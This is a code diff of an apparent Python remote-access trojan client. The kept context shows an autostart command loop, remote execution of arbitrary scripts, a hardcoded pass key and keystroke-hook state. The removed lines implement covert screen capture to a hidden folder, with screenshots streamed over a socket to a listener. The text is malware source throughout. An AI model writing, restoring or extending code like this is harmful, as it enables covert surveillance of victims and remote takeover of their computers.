@@ -6,7 +6,6 @@ import time
 import os
 import subprocess
 import ctypes
-import ImageGrab
 
 HOST = '127.0.0.1'
 PORT = 4434
@@ -15,10 +14,6 @@ printf = ''
 hooked = {}
 loggingState = False
 passKey = r'1705a7f91b40320a19db18912b72148e'
-tmpFolder = os.path.join(os.path.expanduser('~'), 'iDocuments')
-
-if not os.path.exists(tmpFolder):
-    os.makedirs(tmpFolder)
 
 def Send(sock, cmd, end="[ENDOFMESSAGE]"):
     sock.sendall((cmd + end).encode('utf-8'))
@@ -34,31 +29,6 @@ def Receive(sock, end="[ENDOFMESSAGE]"):
         else:
             l = sock.recv(1024)
     return data[:-len(end)].decode('utf-8')
-
-def ScreenCast():
-    print 'aq'
-    ImageGrab.grab().save(os.path.join(tmpFolder, "tmp.jpg"), "JPEG")
-    sc = socket.socket()
-    sc.settimeout(None)
-    print 'done initializing'
-    while 1:
-        try:
-            sc.connect(("localhost",9999))
-            print 'connected'
-            f=open (os.path.join(tmpFolder, "tmp.jpg"), "rb")
-            l = f.read(1024)
-            while (l):
-                sc.send(l)
-                l = f.read(1024)
-            sc.close()
-            f.close()
-            os.remove(os.path.join(tmpFolder, "tmp.jpg"))
-            print 'done'
-            break
-        except Exception as e:
-            print e
-            continue
-
 
 
 def Execute(source):
@@ -130,9 +100,6 @@ def fromAutostart():
                         stdoutput = ''
                     elif data.startswith("runscript"):
                         stdoutput = Execute(data[10:])
-                    elif data.startswith('startScreenCasting'):
-                        ScreenCast()
-                        stdoutput = 'started'
                     elif data.startswith("ls"):
                         string = {}
                         try:
